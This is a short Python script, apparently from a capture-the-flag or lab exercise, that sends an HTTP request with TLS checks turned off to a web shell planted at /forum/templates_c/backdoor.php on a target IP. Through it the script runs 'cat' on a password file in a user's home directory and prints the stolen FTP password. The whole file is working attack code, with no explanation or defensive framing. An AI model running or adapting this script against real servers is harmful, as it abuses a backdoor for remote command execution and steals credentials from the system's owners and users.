import requests
import sys
requests.packages.urllib3.disable_warnings()

def get_password(ip):
    url = "https://{ip}/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password".format(ip=ip)

    response = requests.get(url, verify=False)

    if response.status_code != 200:
        sys.exit("request failed, check the IP")

    print("FTP Password:", response.content)

if __name__ == "__main__":
	if len(sys.argv) != 2:
		sys.exit("Usage: python3 webshell_ftp_password_script.py  <IP>")
	else:
		ip = sys.argv[1]
		get_password(ip)
